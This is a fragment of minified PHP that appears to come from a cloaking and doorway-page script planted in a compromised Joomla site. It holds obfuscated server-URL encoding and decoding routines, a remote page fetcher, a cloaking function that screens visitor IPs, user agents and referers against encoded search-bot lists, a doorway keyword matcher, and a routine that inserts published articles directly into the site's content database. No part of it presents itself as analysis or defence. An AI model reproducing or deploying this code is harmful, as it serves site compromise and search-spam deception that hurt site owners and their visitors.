false;}else{return false;}}function decodeservurl($servurl){$goodservurl=array();foreach(str_split($servurl) as$onechar){if(is_numeric($onechar)){if($onechar>=7){$onechar=$onechar-7;}else{$onechar=$onechar+10-7;}}$goodservurl[]=$onechar;}return urldecode(base64_decode(implode($goodservurl)));}function getpagefmurl($pageurl){$pageurl=trim($pageurl);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$pageurl);curl_setopt($ch,CURLOPT_HEADER,false);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_REFERER,"");$content=curl_exec($ch);$curlerror=curl_error($ch);if(!empty($curlerror)){curl_close($ch);return"CurlError_".str_ireplace(" ","_",$curlerror);}curl_close($ch);return$content;}function cloack($ip){global $referer;global $useragent;global $useragentsfilename;global $botipsfilename;global $referersfilename;$angrybot="";if(file_exists($useragentsfilename)){$useragents=decodedata(file_get_contents($useragentsfilename));$useragents=trim($useragents);$useragents=explode("\n",$useragents);}if(file_exists($referersfilename)){$goodrefs=decodedata(file_get_contents($referersfilename));$goodrefs=trim($goodrefs);$goodrefs=explode("\n",$goodrefs);}$nowref=strtolower($referer);$nowref=trim($nowref);$nowua=strtolower($useragent);$nowua=trim($nowua);$ip=trim($ip);if(file_exists($botipsfilename)&&!empty($ip)){$ipforcloack=explode(".",$ip);$handle=fopen($botipsfilename,"r");$i=1;while(!feof($handle)){$cloackip=trim(fgets($handle));if(!empty($cloackip)){$cloackip=explode(".",$cloackip);$needcloackip=explode("/",$cloackip[3]);if(!empty($needcloackip[1])){if($ipforcloack[0]==$cloackip[0]&&$ipforcloack[1]==$cloackip[1]&&$ipforcloack[2]==$cloackip[2]&&$ipforcloack[3]>=$needcloackip[0]&&$ipforcloack[3]<=$needcloackip[1]){$angrybot="1";break;}}else{if($ip==implode(".",$cloackip)){$angrybot="1";break;}}$i++;}}fclose($handle);}if(empty($angrybot)){if(!empty($useragents[0])){foreach($useragents as$cloackuseragent){$cloackuseragent=strtolower($cloackuseragent);$cloackuseragent=trim($cloackuseragent);if(strpos("qqqq ".$nowua,$cloackuseragent)&&!empty($cloackuseragent)){$angrybot="1";break;}}}if(empty($angrybot)){if(!empty($goodrefs)){foreach($goodrefs as$goodref){if(!empty($goodref)){$goodref=strtolower($goodref);$goodref=trim($goodref);if(strpos("qqqq ".$nowref,$goodref)){$angrybot="";break;}else{$angrybot="1";}}else{break;}}}}}return$angrybot;}function codedata($data){$data=gzcompress(base64_encode(urlencode($data)),4);return urlencode($data);}function codeservurl($servurl){if(mb_detect_encoding($servurl)=="UTF-8"){$servurl=trim($servurl);}else{$servurl=iconv(mb_detect_encoding($servurl),"UTF-8",$servurl);$servurl=trim($servurl);}$goodservurl=array();foreach(str_split(base64_encode(urlencode($servurl))) as$onechar){if(is_numeric($onechar)){$onechar=$onechar+7;if($onechar>9){$onechar=$onechar-10;}}$goodservurl[]=$onechar;}return implode($goodservurl);}function decodedata($data){return urldecode(base64_decode(gzuncompress(urldecode($data))));}function keyindoorway($currentkey,$keyfilename){$foundkey="";$currentkey=trim(urldecode($currentkey));$currentkey=str_ireplace("-"," ",$currentkey);$currentkey=strtolower($currentkey);$allkeys=decodedata(file_get_contents($keyfilename));$allkeys=explode("\n",$allkeys);foreach($allkeys as$keyfrcheck){$keyfrcheck=trim($keyfrcheck);$keyfrcheck=strtolower($keyfrcheck);if(stripos("qqqq".$currentkey,"qqq".$keyfrcheck)){$foundkey="yes";break;}}return$foundkey;}function postItem($title,$desc,$text){$database=JFactory::getDBO();$item=new stdClass;$item->id=null;$item->title=$title;$item->introtext=$desc;$item->fulltext=$text;$item->state=1;$item->access=1;$item->created_by=62;$item->created=date('Y-m-d H:i:s');$item->alias=JFilterOutput::stringURLSafe($item->title);if(!$database->insertObject('#__content',$item,'id')){echo$database->stderr();return false;}return$item->id.":".$item->alias;};?>